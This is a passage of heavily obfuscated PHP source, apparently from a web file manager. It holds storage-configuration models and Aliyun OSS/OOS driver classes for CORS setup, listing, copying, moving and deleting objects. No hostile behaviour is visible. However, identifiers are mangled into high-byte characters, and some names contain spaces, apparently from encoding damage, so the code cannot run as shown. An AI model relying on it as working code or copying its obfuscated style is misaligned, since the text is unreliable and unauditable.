$Åà¨ßØ² = 0; foreach ($ü÷í·ù as $¨µ”ÏÈ¨) { if ($¨µ”ÏÈ¨[$‰òÇœòå[37]] && $¨µ”ÏÈ¨[$‰òÇœòå[399]] != $ŸÒŠõÛ) { $Åà¨ßØ² = $¨µ”ÏÈ¨[$‰òÇœòå[399]]; parent::update($¨µ”ÏÈ¨[$‰òÇœòå[399]], array($‰òÇœòå[37] => 0)); } } $this->updateBackup($ŸÒŠõÛ, $Åà¨ßØ²); } return $˜¡ÓˆÚ; } public function add($®³»°À¤) { $×ä‹¥Ÿå =& $_SERVER[óó‹¸‚å]; $É–„÷ÚÎ = array_to_keyvalue(parent::listData(), $×ä‹¥Ÿå[32]); if (isset($É–„÷ÚÎ[$®³»°À¤[$×ä‹¥Ÿå[32]]])) { return !1; } $this->checkConfig($®³»°À¤); $Şƒ¥Ëä— = parent::insert($®³»°À¤); if ($Şƒ¥Ëä— && $®³»°À¤[$×ä‹¥Ÿå[37]]) { foreach ($É–„÷ÚÎ as $–…ÀßĞå) { if ($–…ÀßĞå[$×ä‹¥Ÿå[37]]) { parent::update($–…ÀßĞå[$×ä‹¥Ÿå[399]], array($×ä‹¥Ÿå[37] => 0)); } } } return $Şƒ¥Ëä—; } public function updateBackup($Æ­ğÊıò, $×æ­ÂÏ) { $¾Š¡ô­ =& $_SERVER[óó‹¸‚å]; if (!$×æ­ÂÏ) { return; } $İì”‡¤Ş = Model($¾Š¡ô­[753])->config(); if ($İì”‡¤Ş[$¾Š¡ô­[1644]] != $¾Š¡ô­[88] || $İì”‡¤Ş[$¾Š¡ô­[756]] != $×æ­ÂÏ) { return; } $ïĞÄÏÆµ = Model($¾Š¡ô­[774])->get($¾Š¡ô­[784]); $ïĞÄÏÆµ = json_decode($ïĞÄÏÆµ, !0); if (!$ïĞÄÏÆµ) { return; } $ïĞÄÏÆµ[$¾Š¡ô­[756]] = $Æ­ğÊıò; Model($¾Š¡ô­[774])->set(array($¾Š¡ô­[784] => $ïĞÄÏÆµ)); } public function checkPwd($—Ù¤ıÍõ, &$¼£©áüñ) { $å¥öØ¢è =& $_SERVER[óó‹¸‚å]; if (empty($¼£©áüñ[$å¥öØ¢è[6]])) { return; } $ø¡Ì¤Ó÷ = json_decode($¼£©áüñ[$å¥öØ¢è[6]], !0); $„ñŞ“ƒ½ = $å¥öØ¢è[12]; $ÎñŸÍİÑ = array($å¥öØ¢è[2179], $å¥öØ¢è[2180], $å¥öØ¢è[896]); foreach ($ÎñŸÍİÑ as $ªığ°ñÉ) { if (isset($ø¡Ì¤Ó÷[$ªığ°ñÉ])) { $„ñŞ“ƒ½ = $ªığ°ñÉ; break; } } if (!$„ñŞ“ƒ½) { return; } $¢»Ç€ïÄ = $this->getConfig($—Ù¤ıÍõ); $÷«˜šŸñ = $¢»Ç€ïÄ[$„ñŞ“ƒ½]; $øŞ§èŸ… = $ø¡Ì¤Ó÷[$„ñŞ“ƒ½]; if ($øŞ§èŸ… == str_repeat($å¥öØ¢è[188], strlen($÷«˜šŸñ))) { $ø¡Ì¤Ó÷[$„ñŞ“ƒ½] = $÷«˜šŸñ; $¼£©áüñ[$å¥öØ¢è[6]] = json_encode($ø¡Ì¤Ó÷); } else { if ($øŞ§èŸ… != $÷«˜šŸñ) { $¼£©áüñ[$å¥öØ¢è[2178]] = $å¥öØ¢è[88]; } } } public function checkConfig(&$³éáÍ ğ, $èÁò = false) { $Ëèè šª =& $_SERVER[óó‹¸‚å]; $äì¯¸Ú• = strtolower($³éáÍ ğ[$Ëèè šª[95]]); $áƒ—Æ€Ñ = json_decode($³éáÍ ğ[$Ëèè šª[6]], !0); foreach ($áƒ—Æ€Ñ as $¿†¤Íº¥ => $¯¶¤ü¥) { $áƒ—Æ€Ñ[$¿†¤Íº¥] = trim($¯¶¤ü¥); } $áƒ—Æ€Ñ[$Ëèè šª[2181]] = rand_string(6); $ôçı¾‘Ò = $GLOBALS[$Ëèè šª[6]][$Ëèè šª[89]][$Ëèè šª[830]]; $“ñ ÈìÛ = isset($ôçı¾‘Ò[$äì¯¸Ú•]) ? $ôçı¾‘Ò[$äì¯¸Ú•] : ucfirst($äì¯¸Ú•); $¹ø¶¿é‹ = $Ëèè šª[74] . $“ñ ÈìÛ; if (!$“ñ ÈìÛ || !class_exists($¹ø¶¿é‹)) { if ($èÁò) { return LNG($Ëèè šª[2182]); } write_log(array($Ëèè šª[2183], $³éáÍ ğ, get_caller_info()), $Ëèè šª[2184]); show_json(LNG($Ëèè šª[2182]), !1, $³éáÍ ğ); } $áÉãÌ±¨ = new $¹ø¶¿é‹($áƒ—Æ€Ñ); if (in_array($äì¯¸Ú•, $áÉãÌ±¨->objectDriver)) { if (!$áÉãÌ±¨->isBucketCors() && !$áÉãÌ±¨->setBucketCors()) { $ÓÙãŠ§Í = LNG($Ëèè šª[2185]); $ÓÙãŠ§Í .= $Ëèè šª[2186] . LNG($Ëèè šª[2187]); if ($èÁò) { return $ÓÙãŠ§Í; } show_json($ÓÙãŠ§Í, !1); } } $‰Œµ¢¡ = rtrim($áƒ—Æ€Ñ[$Ëèè šª[1188]], $Ëèè šª[8]) . $Ëèè šª[8]; $ËìÕîë² = $áÉãÌ±¨->getPath($‰Œµ¢¡ . $Ëèè šª[1192]); if (!$áÉãÌ±¨->mkfile($ËìÕîë²)) { if ($èÁò) { return LNG($Ëèè šª[2185]); } show_json(LNG($Ëèè šª[2185]), !1); } $áƒ—Æ€Ñ[$Ëèè šª[1188]] = $‰Œµ¢¡; $³éáÍ ğ[$Ëèè šª[6]] = json_encode($áƒ—Æ€Ñ); $³éáÍ ğ[$Ëèè šª[95]] = $“ñ ÈìÛ; return !0; } public function driverListSystem() { $ş„ã‡™Ô =& $_SERVER[óó‹¸‚å]; $¯‚òŞù = parent::listData(); $á¼¿êÀË = array(); foreach ($¯‚òŞù as $ŸıÍ¥¨…) { unset($ŸıÍ¥¨…[$ş„ã‡™Ô[200]], $ŸıÍ¥¨…[$ş„ã‡™Ô[85]]); $ŸıÍ¥¨…[$ş„ã‡™Ô[6]] = json_decode($ŸıÍ¥¨…[$ş„ã‡™Ô[6]], !0); $á¼¿êÀË[] = $ŸıÍ¥¨…; } return $á¼¿êÀË; } public function defaultDriver() { $Ç–ÑàåÂ =& $_SERVER[óó‹¸‚å]; $™ÉàŒÜú = parent::listData(); $çéÚ’§± = array_filter_by_field($™ÉàŒÜú, $Ç–ÑàåÂ[37], 1); $çéÚ’§± = $çéÚ’§±[0]; if ($çéÚ’§±) { $çéÚ’§±[$Ç–ÑàåÂ[6]] = json_decode($çéÚ’§±[$Ç–ÑàåÂ[6]], !0); } return $çéÚ’§±; } public function driverInfo($±¢÷š†ş) { $ì‡èˆä =& $_SERVER[óó‹¸‚å]; $ø…Ø¶Š = array_to_keyvalue(parent::listData(), $ì‡èˆä[399]); if (!isset($ø…Ø¶Š[$±¢÷š†ş])) { return !1; } $ÆàÍ¥±Ğ = $ø…Ø¶Š[$±¢÷š†ş]; $ÆàÍ¥±Ğ[$ì‡èˆä[6]] = json_decode($ÆàÍ¥±Ğ[$ì‡èˆä[6]], !0); return $ÆàÍ¥±Ğ; } public function remove($—Áú¤ ò) { $this->removeShareItems($—Áú¤ ò); return parent::remove($—Áú¤ ò); } public function removeWithFile($ÏïÄî²™, $Ñ»ÈØï) { $÷ğ—‚Ù =& $_SERVER[óó‹¸‚å]; $¹‹’Òâ = array($÷ğ—‚Ù[821] => $ÏïÄî²™); $Œ¶Ïì†˜ = Model($÷ğ—‚Ù[471])->where($¹‹’Òâ)->count(); $®ì ¸²Ò = Model($÷ğ—‚Ù[471])->where($¹‹’Òâ)->sum($÷ğ—‚Ù[76]); $½±’—â = $Ñ»ÈØï . $÷ğ—‚Ù[2188] . $ÏïÄî²™; $¸ÄÑºÀ = LNG($Ñ»ÈØï == $÷ğ—‚Ù[557] ? $÷ğ—‚Ù[2189] : $÷ğ—‚Ù[2190]); $Í‘›•Âî = new TaskFileTransfer($½±’—â, $÷ğ—‚Ù[2184], $Œ¶Ïì†˜, $¸ÄÑºÀ . "\50{$ÏïÄî²™}\x29"); $Í‘›•Âî->task[$÷ğ—‚Ù[767]] = (double) $®ì ¸²Ò; $åÇòÉ = KodIO::defaultDriver(); $Æ‡Îû–Ù = $åÇòÉ[$÷ğ—‚Ù[399]]; $Õ£‚ß–Š = "\173\151\x6f\72{$Æ‡Îû–Ù}\175\x2f"; $ªÑ¢¼à¤ = !0; $ˆ¦ë¦’Ş = array(); $¦şÁïĞ› = Model($÷ğ—‚Ù[199])->where($¹‹’Òâ)->field($÷ğ—‚Ù[2191])->select(); foreach ($¦şÁïĞ› as $Ä¶ë³ä½) { $ŠÒ¾¿ªö = $Ä¶ë³ä½[$÷ğ—‚Ù[84]]; $»¿ªá¥ç = $Õ£‚ß–Š . str_replace("\x7b\x69\157\x3a{$ÏïÄî²™}\x7d\x2f", $÷ğ—‚Ù[12], $ŠÒ¾¿ªö); if (!IO::exist($ŠÒ¾¿ªö)) { $ˆ¦ë¦’Ş[] = $Ä¶ë³ä½[$÷ğ—‚Ù[468]]; $Í‘›•Âî->updateFileEnd($Ä¶ë³ä½[$÷ğ—‚Ù[32]], $Ä¶ë³ä½[$÷ğ—‚Ù[76]]); continue; } if (IO::exist($»¿ªá¥ç)) { $Í‘›•Âî->updateFileEnd($Ä¶ë³ä½[$÷ğ—‚Ù[32]], $Ä¶ë³ä½[$÷ğ—‚Ù[76]]); continue; } if (!IO::move($ŠÒ¾¿ªö, get_path_father($»¿ªá¥ç))) { $ªÑ¢¼à¤ = !1; break; } $¹‹’Òâ = array($÷ğ—‚Ù[468] => $Ä¶ë³ä½[$÷ğ—‚Ù[468]]); $Óß§åÙ = array($÷ğ—‚Ù[821] => $Æ‡Îû–Ù, $÷ğ—‚Ù[84] => $»¿ªá¥ç); Model($÷ğ—‚Ù[199])->where($¹‹’Òâ)->save($Óß§åÙ); } $this->removeByFileID($ˆ¦ë¦’Ş); if (!$ªÑ¢¼à¤) { $Í‘›•Âî->stop($½±’—â); return !1; } $Í‘›•Âî->end(); if ($Ñ»ÈØï == $÷ğ—‚Ù[1832]) { $this->remove($ÏïÄî²™); } } public function progress($¥ã‚¿—¹, $è¸ƒÀ¤ñ) { return Task::get($è¸ƒÀ¤ñ . $_SERVER[óó‹¸‚å][2188] . $¥ã‚¿—¹); } private function removeByFileID($÷ƒ‚Äö = array()) { $Åáíïü =& $_SERVER[óó‹¸‚å]; if (empty($÷ƒ‚Äö)) { return; } $›ÊÃÕ†Š = array($Åáíïü[468] => array($Åáíïü[7], $÷ƒ‚Äö)); $ñ…›”‹º = Model($Åáíïü[1343])->where($›ÊÃÕ†Š)->field($Åáíïü[402])->select(); if (!$ñ…›”‹º) { return; } $ñ…›”‹º = array_to_keyvalue($ñ…›”‹º, $Åáíïü[12], $Åáíïü[402]); foreach ($ñ…›”‹º as $³óßÕ½) { Model($Åáíïü[416])->removeNow($³óßÕ½, !1); } } private function removeShareItems($´ÜÓ×¹œ) { $¹…µãÜÒ =& $_SERVER[óó‹¸‚å]; $Ûé´€¸‘ = "\x7b\151\157\72{$´ÜÓ×¹œ}\175\x2f"; $öå½°Ë÷ = array($¹…µãÜÒ[402] => 0, $¹…µãÜÒ[1183] => array($¹…µãÜÒ[383], "{$Ûé´€¸‘}\45")); $âôÓš™Ì = Model($¹…µãÜÒ[1843])->where($öå½°Ë÷)->field($¹…µãÜÒ[489])->select(); if (empty($âôÓš™Ì)) { return; } $×üåĞ¢· = array_to_keyvalue($âôÓš™Ì, $¹…µãÜÒ[12], $¹…µãÜÒ[489]); Model($¹…µãÜÒ[601])->remove($×üåĞ¢·); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\x4c\151\147\x68\164\x41\x70\160"; public $modelType = "\123\x79\x73\x74\x65\x6d\117\160\164\x69\157\156"; public $field = array("\156\141\x6d\x65", "\147\x72\x6f\165\160", "\x64\145\163\143", "\143\x6f\156\x74\145\x6e\164"); public function listData($¼¿¢şôğ = false, $‚½Îã´Õ = "\x6d\x6f\x64\x69\x66\171\124\x69\x6d\145", $§»©Ó¹Ä = true) { return parent::listData($¼¿¢şôğ, $‚½Îã´Õ, $§»©Ó¹Ä); } public function remove($È¸¢¿‡ë) { $Öè‚¡˜¥ = $this->findByName($È¸¢¿‡ë); if (!$Öè‚¡˜¥) { return !1; } return parent::remove($Öè‚¡˜¥[$_SERVER[óó‹¸‚å][399]]); } public function add($º”Äñ’ã) { if ($this->findByName($º”Äñ’ã[$_SERVER[óó‹¸‚å][32]])) { return !1; } return parent::insert($º”Äñ’ã); } public function update($ˆö­äÆÇ, $´ãÆË•³) { $ãÒ°û¸ñ =& $_SERVER[óó‹¸‚å]; $ËıˆÅ¶Ñ = $this->findByName($ˆö­äÆÇ); $·ˆÄ¬‚™ = $this->findByName($´ãÆË•³[$ãÒ°û¸ñ[32]]); if (!$ËıˆÅ¶Ñ || $·ˆÄ¬‚™ && $·ˆÄ¬‚™[$ãÒ°û¸ñ[399]] != $ËıˆÅ¶Ñ[$ãÒ°û¸ñ[399]]) { return !1; } return parent::update($ËıˆÅ¶Ñ[$ãÒ°û¸ñ[399]], $´ãÆË•³); } } goto a–Óß±¡…; B™Ñ½«‘ãô: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ü”òÎ»š) { parent::__construct($ü”òÎ»š); $this->signatureVersion($_SERVER[óó‹¸‚å][216]); } public function fileOutLink($éŸêŸúœ) { $®å‘â€¼ =& $_SERVER[óó‹¸‚å]; if (substr($éŸêŸúœ, 0, 7) == $®å‘â€¼[1341]) { $éŸêŸúœ = $®å‘â€¼[1342] . substr($éŸêŸúœ, 7); } header($®å‘â€¼[161] . $éŸêŸúœ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($‰İı€›“) { parent::__construct(); include_once SDK_DIR . $_SERVER[óó‹¸‚å][1400]; $this->_init($‰İı€›“); } public function _init($¦Ç–¶š) { $¡›íïæ =& $_SERVER[óó‹¸‚å]; foreach ($¦Ç–¶š as $³¿€®ëá => $˜ü‰²î¡) { if (isset($this->{$³¿€®ëá})) { $this->{$³¿€®ëá} = $˜ü‰²î¡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¡›íïæ[1401] . LNG($¡›íïæ[1402])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¿æ¹ò  =& $_SERVER[óó‹¸‚å]; $º’İË§² = new OSS\Model\CorsConfig(); $‚Ã¾¯æ = new OSS\Model\CorsRule(); $‚Ã¾¯æ->addAllowedOrigin($¿æ¹ò [1403]); $‚Ã¾¯æ->addAllowedMethod($¿æ¹ò [1404]); $‚Ã¾¯æ->addAllowedMethod($¿æ¹ò [1405]); $‚Ã¾¯æ->addAllowedMethod($¿æ¹ò [1406]); $‚Ã¾¯æ->addAllowedMethod($¿æ¹ò [1407]); $‚Ã¾¯æ->addAllowedMethod($¿æ¹ò [160]); $‚Ã¾¯æ->setMaxAgeSeconds(600); $‚Ã¾¯æ->addExposeHeader($¿æ¹ò [1408]); $‚Ã¾¯æ->addAllowedHeader($¿æ¹ò [1403]); $º’İË§²->addRule($‚Ã¾¯æ); try { $this->client->putBucketCors($this->bucket, $º’İË§²); } catch (OSS\Core\OssException $ğ«©Š×ˆ) { return !1; } return !0; } public function getBucketCors() { $ã¢íÉÎ— =& $_SERVER[óó‹¸‚å]; $ÒæèçÓ™ = null; try { $ÒæèçÓ™ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $…¾Ãã€ê) { return null; } if (!$ÒæèçÓ™ || !($†®¡Šç = $ÒæèçÓ™->getRules())) { return null; } $èí“ˆÏ¿ = $†®¡Šç[0]->getAllowedOrigins(); $´±ÁŠ¢é = $†®¡Šç[0]->getAllowedMethods(); $™«àû¤¾ = $†®¡Šç[0]->getMaxAgeSeconds(); $—§ÄÅ¬İ = $†®¡Šç[0]->getExposeHeaders(); $«–¼ğø  = $†®¡Šç[0]->getAllowedHeaders(); return array($ã¢íÉÎ—[187] => isset($èí“ˆÏ¿[0]) ? $èí“ˆÏ¿[0] : $ã¢íÉÎ—[12], $ã¢íÉÎ—[191] => $´±ÁŠ¢é, $ã¢íÉÎ—[1409] => $™«àû¤¾, $ã¢íÉÎ—[1410] => isset($—§ÄÅ¬İ[0]) ? $—§ÄÅ¬İ[0] : $ã¢íÉÎ—[12], $ã¢íÉÎ—[189] => isset($«–¼ğø [0]) ? $«–¼ğø [0] : $ã¢íÉÎ—[12]); } public function isBucketCors() { $íÌÅû¡° =& $_SERVER[óó‹¸‚å]; $¸ı™¶· = $this->getBucketCors(); if (!$¸ı™¶· || !is_array($¸ı™¶·)) { return !1; } if ($¸ı™¶·[$íÌÅû¡°[187]] != $íÌÅû¡°[188] || $¸ı™¶·[$íÌÅû¡°[189]] != $íÌÅû¡°[188]) { return !1; } $ªØşùİÍ = array_map($íÌÅû¡°[190], $¸ı™¶·[$íÌÅû¡°[191]]); if (!is_array($ªØşùİÍ)) { $ªØşùİÍ = array(); } $‚ÓÒÊŞŒ = array($íÌÅû¡°[192], $íÌÅû¡°[193], $íÌÅû¡°[194], $íÌÅû¡°[195], $íÌÅû¡°[196]); $ä˜ø’¹ô = array_diff($‚ÓÒÊŞŒ, $ªØşùİÍ); return empty($ä˜ø’¹ô); } public function mkfile($Ä”Ş‘†, $‘Ü®º = '', $¡·ìàÓÇ = REPEAT_RENAME) { $œèØ»éï = $this->setContent($Ä”Ş‘†, $‘Ü®º); if ($œèØ»éï !== !1) { return $this->getPathOuter($Ä”Ş‘†); } return !1; } public function mkdir($èÕ™Šüì, $õ¯¤¿Œƒ = REPEAT_SKIP) { if ($õ¯¤¿Œƒ && $this->_isFolder($èÕ™Šüì)) { return $this->getPathOuter($èÕ™Šüì); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($èÕ™Šüì)); } catch (OSS\Core\OssException $™Üúø©±) { return !1; } return $this->getPathOuter($èÕ™Šüì); } private function fileList($¤íóíÁ½, $ÃİÀÒÄ¬ = '', $à©…€€¤ = 0) { $Í·ä‚²– =& $_SERVER[óó‹¸‚å]; $¤íóíÁ½ = trim($¤íóíÁ½, $Í·ä‚²–[8]); $•Î²¢™õ = empty($¤íóíÁ½) && $¤íóíÁ½ !== $Í·ä‚²–[197] ? $Í·ä‚²–[12] : $¤íóíÁ½ . $Í·ä‚²–[8]; $ÉÙƒ˜µ‚ = $Í·ä‚²–[12]; $¼Üç—÷ã = 1000; $Ş°–ÚÈ = $á›…âİ÷ = array(); while (!0) { check_abort(); $øëøÍà = array($Í·ä‚²–[1411] => $ÃİÀÒÄ¬, $Í·ä‚²–[1412] => $•Î²¢™õ, $Í·ä‚²–[1413] => $¼Üç—÷ã, $Í·ä‚²–[1414] => $ÉÙƒ˜µ‚); try { $Ùç°”‰½ = $this->client->listObjects($this->bucket, $øëøÍà); } catch (OSS\Core\OssException $ä„‘ˆ‡) { break; } $ÉÙƒ˜µ‚ = $Ùç°”‰½->getNextMarker(); $ó«¬†Ïõ = $Ùç°”‰½->getObjectList(); $×¸ñşê» = $Ùç°”‰½->getPrefixList(); foreach ($ó«¬†Ïõ as $ÑçÚéşä) { if ($ÑçÚéşä->getKey() == $•Î²¢™õ) { continue; } $ú¤ºà²¤ = $ÑçÚéşä->getKey(); $ê‚‡çöÜ = $ÑçÚéşä->getSize(); $É“‚¼Ñğ = $ÑçÚéşä->getLastModified(); $ì™ûÆÁÙ = $à©…€€¤ ? array($Í·ä‚²–[32] => $ú¤ºà²¤, $Í·ä‚²–[76] => $ê‚‡çöÜ, $Í·ä‚²–[203] => strtotime($É“‚¼Ñğ)) : $ú¤ºà²¤; $½šÜ…°æ = $ê‚‡çöÜ == 0 && substr($ú¤ºà²¤, strlen($ú¤ºà²¤) - 1, 1) == $Í·ä‚²–[8] ? !0 : !1; $àÂÊÄ = array($Í·ä‚²–[76] => $ê‚‡çöÜ, $Í·ä‚²–[1415] => $ê‚‡çöÜ, $Í·ä‚²–[85] => strtotime($É“‚¼Ñğ), $Í·ä‚²–[1416] => $É“‚¼Ñğ); $this->cacheMethodInfoSet($ú¤ºà²¤, $½šÜ…°æ, $àÂÊÄ); if ($½šÜ…°æ) { $Ş°–ÚÈ[] = $ú¤ºà²¤; continue; } $á›…âİ÷[] = $ì™ûÆÁÙ; } foreach ($×¸ñşê» as $Æ·üèİ) { $Ş°–ÚÈ[] = $Æ·üèİ->getPrefix(); $this->cacheMethodInfoSet($Æ·üèİ->getPrefix(), !0); } if ($ÉÙƒ˜µ‚ === $Í·ä‚²–[12]) { break; } } $this->cacheMethodInfoSet($¤íóíÁ½, !0); return array($Í·ä‚²–[82] => $Ş°–ÚÈ, $Í·ä‚²–[83] => $á›…âİ÷); } public function copyFile($é¨óñÑè, $Í¥òöÆá) { $âÉ•Ó¿ = $this->size($é¨óñÑè); if ($âÉ•Ó¿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $é¨óñÑè, $this->bucket, $this->pathEncode($Í¥òöÆá)); } catch (OSS\Core\OssException $²§ı¡ş) { return !1; } return $this->getPathOuter($Í¥òöÆá); } $ê·ˆ¯Ÿ… = $this->multiCopyObject($é¨óñÑè, $Í¥òöÆá, $âÉ•Ó¿); return $ê·ˆ¯Ÿ… ? $this->getPathOuter($Í¥òöÆá) : !1; } private function multiCopyObject($ àáì±Ÿ, $ŠÛâïİ, $»Ì¡¤¾ï) { $™¥¢ÃØü =& $_SERVER[óó‹¸‚å]; try { $¢á§Æ½­ = array(); if ($ƒ‡Ç¯ºÇ = $this->hashMd5($ àáì±Ÿ)) { $¢á§Æ½­ = array(OSS\OssClient::OSS_HEADERS => array($™¥¢ÃØü[1417] => $ƒ‡Ç¯ºÇ)); } $©‚¶«» = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŠÛâïİ), $¢á§Æ½­); $Ç°—³Œ = 1; $³ Àï™ = 0; $…—†ÓîÁ = array(); $íüØŒåª = 1024 * 1024 * 10; $áÇ‰­§ú = $this->client->generateMultiuploadParts($»Ì¡¤¾ï, $íüØŒåª); foreach ($áÇ‰­§ú as $§ˆ²­» => $÷´íäïÊ) { $Ã·ûòˆ´ = $³ Àï™ + (int) $÷´íäïÊ[$™¥¢ÃØü[1418]]; $–×§Ù±˜ = (int) $÷´íäïÊ[$™¥¢ÃØü[337]] + $Ã·ûòˆ´ - 1; $˜ß·‹‚ = array($™¥¢ÃØü[1419] => $Ã·ûòˆ´, $™¥¢ÃØü[1420] => $–×§Ù±˜); $…—†ÓîÁ[] = $this->client->uploadPartCopy($this->bucket, $ àáì±Ÿ, $this->bucket, $this->pathEncode($ŠÛâïİ), $Ç°—³Œ, $©‚¶«», $˜ß·‹‚); $Ç°—³Œ = $Ç°—³Œ + 1; } $¬¨¿¥ŠØ = array(); foreach ($…—†ÓîÁ as $§ˆ²­» => $“èÂ±Æ‡) { $¬¨¿¥ŠØ[] = array($™¥¢ÃØü[1421] => $§ˆ²­» + 1, $™¥¢ÃØü[1422] => $“èÂ±Æ‡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ŠÛâïİ), $©‚¶«», $¬¨¿¥ŠØ); } catch (OSS\Core\OssException $Ü¯¨£Ô–) { return !1; } return !0; } public function moveFile($¦ü­¶§°, $ÑÈ¤ö ¢) { if ($this->copyFile($¦ü­¶§°, $ÑÈ¤ö ¢)) { $this->remove($¦ü­¶§°); return $this->getPathOuter($ÑÈ¤ö ¢); } return !1; } public function delFile($¹¾Şá•) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¹¾Şá•)); } catch (OSS\Core\OssException $Ö÷ü±Ş•) { return !1; } return !0; } public function delFolder($Ïè—²ŠÈ) { $©Ô©Á‡ı =& $_SERVER[óó‹¸‚å]; if (!$this->exist($Ïè—²ŠÈ)) { return !0; } $this->listItemCache = !1; $ó¬ˆçÇÄ = $this->fileList($Ïè—²ŠÈ); $this->listItemCache = !0; $àò×¼ş = trim($Ïè—²ŠÈ, $©Ô©Á‡ı[8]) . $©Ô©Á‡ı[8]; if (!empty($Ïè—²ŠÈ) && $Ïè—²ŠÈ !== $©Ô©Á‡ı[197] && !in_array($àò×¼ş, $ó¬ˆçÇÄ[$©Ô©Á‡ı[82]])) { $ó¬ˆçÇÄ[$©Ô©Á‡ı[82]][] = $àò×¼ş; } $Ùß»Êßš = $this->delByBatch($ó¬ˆçÇÄ[$©Ô©Á‡ı[83]]); if (!$Ùß»Êßš) { return !1; } $Ùß»Êßš = $this->delByBatch($ó¬ˆçÇÄ[$©Ô©Á‡ı[82]]); if (!$Ùß»Êßš) { return !1; } return $this->delFile($àò×¼ş); } private function delByBatch($†³¯ê¶¶) { foreach (array_chunk($†³¯ê¶¶, 1000) as $Éå÷»ıÜ) { try { $this->client->deleteObjects($this->bucket, $Éå÷»ıÜ); } catch (OSS\Core\OssException $Æ§¯ı–õ) { return !1; } } return !0; } public function rename($ï–•îé±, $Ôª­ ıå) { return $this->renameObject($ï–•îé±, $Ôª­ ıå); } private function fileInfo($ïıñîÀ, $ÚÅ‹ÚŠ = false, $ùÊêØ = array()) { $Šİ×¹€ =& $_SERVER[óó‹¸‚å]; $‹• ®Áæ = array($Šİ×¹€[32] => $this->pathThis($ïıñîÀ), $Šİ×¹€[84] => $this->getPathOuter($ïıñîÀ), $Šİ×¹€[33] => $Šİ×¹€[199], $Šİ×¹€[76] => isset($ùÊêØ[$Šİ×¹€[76]]) ? $ùÊêØ[$Šİ×¹€[76]] : 0, $Šİ×¹€[174] => $this->ext($ïıñîÀ)); if ($ÚÅ‹ÚŠ) { return $‹• ®Áæ; } $‹• ®Áæ[$Šİ×¹€[200]] = $‹• ®Áæ[$Šİ×¹€[85]] = 0; $‹• ®Áæ[$Šİ×¹€[201]] = $‹• ®Áæ[$Šİ×¹€[202]] = !0; if (empty($ùÊêØ)) { $èã¹Œ¹„ = $this->objectMeta($ïıñîÀ); if (!$èã¹Œ¹„) { return $‹• ®Áæ; } $ùÊêØ = array($Šİ×¹€[85] => strtotime($èã¹Œ¹„[$Šİ×¹€[1416]]), $Šİ×¹€[76] => $èã¹Œ¹„[$Šİ×¹€[1415]] + 0); } if (isset($ùÊêØ[$Šİ×¹€[76]])) { $‹• ®Áæ[$Šİ×¹€[76]] = $ùÊêØ[$Šİ×¹€[76]]; } if (isset($ùÊêØ[$Šİ×¹€[85]])) { $‹• ®Áæ[$Šİ×¹€[85]] = $ùÊêØ[$Šİ×¹€[85]]; } if (isset($ùÊêØ[$Šİ×¹€[203]]) && !trim($‹• ®Áæ[$Šİ×¹€[85]])) { $‹• ®Áæ[$Šİ×¹€[85]] = $ùÊêØ[$Šİ×¹€[203]]; } return $‹• ®Áæ; } private function folderInfo($ˆúİ­Í², $¥ÒöğÀ¦ = false, $¦€Ú´œ = array()) { $‹†â¦úş =& $_SERVER[óó‹¸‚å]; $°½ÀÅö¨ = array($‹†â¦úş[32] => $this->pathThis($ˆúİ­Í²), $‹†â¦úş[84] => $this->getPathOuter($‹†â¦úş[8] . $ˆúİ­Í²), $‹†â¦úş[33] => $‹†â¦úş[75]); if ($¥ÒöğÀ¦) { return $°½ÀÅö¨; } $°½ÀÅö¨[$‹†â¦úş[200]] = $°½ÀÅö¨[$‹†â¦úş[85]] = 0; $°½ÀÅö¨[$‹†â¦úş[201]] = $°½ÀÅö¨[$‹†â¦úş[202]] = !0; if (empty($¦€Ú´œ)) { $ˆúİ­Í² = rtrim($ˆúİ­Í², $‹†â¦úş[8]) . $‹†â¦úş[8]; $€›ÜÎ‘Ğ = $this->objectMeta($ˆúİ­Í²); if (!$€›ÜÎ‘Ğ) { return $°½ÀÅö¨; } $¦€Ú´œ = array($‹†â¦úş[200] => $€›ÜÎ‘Ğ[$‹†â¦úş[511]][$‹†â¦úş[1423]], $‹†â¦úş[85] => strtotime($€›ÜÎ‘Ğ[$‹†â¦úş[1416]])); } if (isset($¦€Ú´œ[$‹†â¦úş[85]])) { $°½ÀÅö¨[$‹†â¦úş[85]] = $¦€Ú´œ[$‹†â¦úş[85]]; } if (isset($¦€Ú´œ[$‹†â¦úş[200]])) { $°½ÀÅö¨[$‹†â¦úş[200]] = $¦€Ú´œ[$‹†â¦úş[200]]; } return $°½ÀÅö¨; } public function listPath($–¶‘à‹õ, $Äª“×›÷ = false) { $ˆå…ûÓ =& $_SERVER[óó‹¸‚å]; $äòÀÊÄ = $this->fileList($–¶‘à‹õ, $ˆå…ûÓ[8], !0); foreach ($äòÀÊÄ[$ˆå…ûÓ[82]] as $ÁĞ¦ÚÇ£ => $©‡œ’ŞØ) { $äòÀÊÄ[$ˆå…ûÓ[82]][$ÁĞ¦ÚÇ£] = $this->folderInfo($©‡œ’ŞØ, $Äª“×›÷, $©‡œ’ŞØ); } foreach ($äòÀÊÄ[$ˆå…ûÓ[83]] as $ÁĞ¦ÚÇ£ => $©‡œ’ŞØ) { $äòÀÊÄ[$ˆå…ûÓ[83]][$ÁĞ¦ÚÇ£] = $this->fileInfo($©‡œ’ŞØ[$ˆå…ûÓ[32]], $Äª“×›÷, $©‡œ’ŞØ); } return $äòÀÊÄ; } protected function infoChildren($Øâåëî¨, &$ôĞó±üì) { $´¨¢Éò” =& $_SERVER[óó‹¸‚å]; $ÏíğĞ®ç = $this->fileList($Øâåëî¨, $´¨¢Éò”[12], !0); $ôĞó±üì[$´¨¢Éò”[78]] += 